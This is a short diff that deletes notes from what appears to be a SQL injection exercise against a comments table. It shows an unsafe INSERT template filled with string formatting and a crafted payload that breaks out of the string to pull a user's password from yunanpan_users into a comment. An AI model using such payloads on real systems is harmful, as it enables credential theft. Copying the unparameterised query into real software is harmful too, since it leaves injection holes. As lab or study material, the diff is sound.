@@ -1,6 +1,0 @@
-INSERT INTO yunanpan_comments (nickname, content) VALUES ('%s', '%s')
-
-INSERT INTO yunanpan_comments (nickname, content) VALUES ('bbb', 'select password from yunanpan_users where id=40');#')
-
-'), ('admin', (select password from yunanpan_users where id=40));#
-
